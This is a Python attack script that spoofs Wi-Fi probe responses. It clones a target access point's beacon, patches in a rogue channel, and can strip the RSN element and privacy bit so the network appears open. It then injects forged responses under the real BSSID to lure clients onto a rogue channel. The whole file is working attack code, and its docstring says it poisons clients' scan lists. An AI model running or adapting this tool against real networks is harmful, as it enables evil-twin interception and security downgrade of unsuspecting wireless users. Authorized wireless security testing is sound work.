#!/usr/bin/env python3
"""
Probe Response injection with full Information Element cloning.

Reads a captured beacon from the target AP (pcap file), extracts
every Information Element, rebuilds them into a Probe Response
template with the DS Parameter Set patched to the rogue channel.

At runtime, listens on a raw AF_PACKET socket for Probe Requests
matching the target SSID. On match, patches the pre-built template
with the client's MAC, an incrementing sequence number, and an
extrapolated TSF timestamp, then injects immediately.

This poisons the client's scan candidate list. The client sees
the "real AP" advertising the rogue channel and roams there
voluntarily. No deauthentication required for the transition.

Design constraints:
  - No Scapy in the hot path. Raw struct packing only.
  - Single pre-built template. Per-packet work is 3 field patches.
  - Kernel BPF is unreliable across RadioTap variations on mt76.
    Userspace filtering with minimal parsing is more portable.
"""

import argparse
import random
import socket
import struct
import sys
import time


FC_PROBE_RESP = 0x0050
IE_DS_PARAM = 3
IE_CSA = 37
IE_RSN = 48


def mac_to_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", ""))


def build_radiotap() -> bytes:
    return struct.pack("<BBHI", 0, 0, 8, 0)


def parse_pcap_first_packet(path: str) -> bytes:
    """Extract the first packet's raw bytes from a pcap file."""
    with open(path, "rb") as f:
        magic = struct.unpack("<I", f.read(4))[0]
        if magic == 0xA1B2C3D4:
            endian = "<"
        elif magic == 0xD4C3B2A1:
            endian = ">"
        else:
            raise ValueError(f"Not a valid pcap: {path}")

        # Skip rest of global header (20 bytes after magic)
        f.read(20)

        # Packet header
        _ts_sec, _ts_usec, incl_len, _orig_len = struct.unpack(
            f"{endian}IIII", f.read(16)
        )
        return f.read(incl_len)


def strip_radiotap(raw: bytes) -> bytes:
    """Remove RadioTap header, return bare 802.11 frame."""
    if len(raw) < 4:
        raise ValueError("Packet too short for RadioTap header")
    rt_len = struct.unpack("<H", raw[2:4])[0]
    return raw[rt_len:]


def parse_beacon(frame: bytes) -> tuple:
    """
    Parse beacon/probe-response fixed fields and all IEs.

    Returns:
        (tsf_bytes, beacon_int, capabilities, ies)
    where ies is a list of (ie_id, ie_data) tuples preserving
    the original order and all vendor-specific elements.
    """
    if len(frame) < 36:
        raise ValueError("Frame too short for beacon body")

    fc = struct.unpack("<H", frame[0:2])[0]
    subtype = (fc >> 4) & 0x0F
    if subtype not in (5, 8):
        raise ValueError(f"Expected beacon(8) or probe-resp(5), got {subtype}")

    body = frame[24:]
    tsf_bytes = body[0:8]
    beacon_int = struct.unpack("<H", body[8:10])[0]
    capabilities = struct.unpack("<H", body[10:12])[0]

    ies = []
    pos = 12
    while pos + 2 <= len(body):
        ie_id = body[pos]
        ie_len = body[pos + 1]
        if pos + 2 + ie_len > len(body):
            break
        ie_data = body[pos + 2 : pos + 2 + ie_len]
        ies.append((ie_id, ie_data))
        pos += 2 + ie_len

    return tsf_bytes, beacon_int, capabilities, ies


def rebuild_ies(
    ies: list,
    rogue_channel: int,
    security_mode: str,
) -> bytes:
    """
    Rebuild the IE blob with targeted modifications:

    - DS Parameter Set (3): patched to rogue_channel
    - CSA (37): stripped (not meaningful in probe response for
      unassociated clients; the DS param does the actual work)
    - RSN (48): stripped when security_mode is OPEN so the
      capabilities field and IE set are internally consistent

    All other IEs (HT, VHT, vendor, country, etc.) are preserved
    byte-for-byte to maintain full fidelity with the real AP.
    """
    out = bytearray()

    for ie_id, ie_data in ies:
        if ie_id == IE_DS_PARAM:
            out += bytes([IE_DS_PARAM, 1, rogue_channel])
            continue

        if ie_id == IE_CSA:
            continue

        if ie_id == IE_RSN and security_mode == "OPEN":
            continue

        out += bytes([ie_id, len(ie_data)]) + ie_data

    return bytes(out)


def build_template(
    bssid_bytes: bytes,
    capabilities: int,
    beacon_int: int,
    ies_bytes: bytes,
    security_mode: str,
) -> bytearray:
    """
    Build a complete Probe Response as a mutable byte array.

    Runtime-patched field offsets:
        [4:10]   Destination MAC (client address)
        [22:24]  Sequence Control
        [24:32]  TSF Timestamp
    """
    f = bytearray()

    # Frame Control: Probe Response
    f += struct.pack("<H", FC_PROBE_RESP)

    # Duration (set by driver on tx)
    f += struct.pack("<H", 0)

    # Address 1: DA — placeholder, patched per-packet
    f += b"\x00" * 6

    # Address 2: SA — real AP BSSID
    f += bssid_bytes

    # Address 3: BSSID — real AP BSSID
    f += bssid_bytes

    # Sequence Control — placeholder, patched per-packet
    f += struct.pack("<H", 0)

    # Timestamp — placeholder, patched per-packet
    f += b"\x00" * 8

    # Beacon Interval
    f += struct.pack("<H", beacon_int)

    # Capabilities — clear Privacy bit for OPEN mode
    if security_mode == "OPEN":
        capabilities &= ~0x0010
    f += struct.pack("<H", capabilities)

    # Information Elements
    f += ies_bytes

    return f


def main():
    parser = argparse.ArgumentParser(
        description="Beacon-cloned Probe Response injection",
    )
    parser.add_argument("--iface", required=True)
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--target-channel", type=int, required=True)
    parser.add_argument("--beacon-pcap", required=True)
    parser.add_argument("--security-mode", default="OPEN")
    parser.add_argument("--duration", type=int, default=5)
    args = parser.parse_args()

    # Startup: parse beacon and build template (one-time cost)
    bssid_bytes = mac_to_bytes(args.bssid)
    target_ssid = args.ssid.encode()

    raw_pkt = parse_pcap_first_packet(args.beacon_pcap)
    dot11 = strip_radiotap(raw_pkt)
    tsf_bytes, beacon_int, capabilities, ies = parse_beacon(dot11)

    patched_ies = rebuild_ies(
        ies, args.target_channel, args.security_mode
    )

    template = build_template(
        bssid_bytes,
        capabilities,
        beacon_int,
        patched_ies,
        args.security_mode,
    )

    radiotap = build_radiotap()

    # Sequence number: start from random offset within the 12-bit space.
    # Not tracking the real AP's seq (would require concurrent beacon
    # sniffing on a busy interface). Random start + monotonic increment
    # is sufficient — macOS enforces seq ordering loosely for probe
    # responses from BSSIDs it's not currently associated to.
    seq_num = random.randint(0, 4095)

    # TSF: extrapolate from the captured beacon's timestamp.
    # TSF is microseconds since AP boot. We continue the counter
    # from the captured value, offset by wall-clock elapsed time.
    tsf_base = struct.unpack("<Q", tsf_bytes)[0]
    tsf_epoch = time.monotonic()

    try:
        sock = socket.socket(
            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
        )
        sock.bind((args.iface, 0))
        sock.settimeout(0.05)
    except (PermissionError, OSError) as e:
        print(f"[probe] socket error: {e}", file=sys.stderr)
        sys.exit(1)

    end_time = time.time() + args.duration
    injected = 0

    try:
        while time.time() < end_time:
            try:
                raw = sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                continue

            # Minimal parsing: RadioTap length → FC → subtype check
            if len(raw) < 30:
                continue
            if raw[0] != 0:
                continue

            rt_len = struct.unpack("<H", raw[2:4])[0]
            remainder = raw[rt_len:]
            if len(remainder) < 24:
                continue

            fc = struct.unpack("<H", remainder[0:2])[0]
            if (fc >> 2) & 0x03 != 0:
                continue
            if (fc >> 4) & 0x0F != 4:
                continue

            # Probe Request confirmed. Extract client MAC (addr2).
            client_mac = remainder[10:16]

            # Validate SSID IE (first IE in probe request body)
            body = remainder[24:]
            if len(body) < 2:
                continue
            if body[0] != 0:
                continue

            ssid_len = body[1]
            if ssid_len > 0:
                if len(body) < 2 + ssid_len:
                    continue
                if body[2 : 2 + ssid_len] != target_ssid:
                    continue
            # ssid_len == 0 → wildcard probe, respond to it

            # Patch template: DA, seq, TSF
            frame = bytearray(template)
            frame[4:10] = client_mac

            seq_num = (seq_num + 1) & 0x0FFF
            frame[22:24] = struct.pack("<H", seq_num << 4)

            elapsed_us = int(
                (time.monotonic() - tsf_epoch) * 1_000_000
            )
            tsf_now = (tsf_base + elapsed_us) & 0xFFFFFFFFFFFFFFFF
            frame[24:32] = struct.pack("<Q", tsf_now)

            sock.send(radiotap + bytes(frame))
            injected += 1

    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
        print(
            f"[probe] injected {injected} cloned responses",
            file=sys.stderr,
        )


if __name__ == "__main__":
    main()
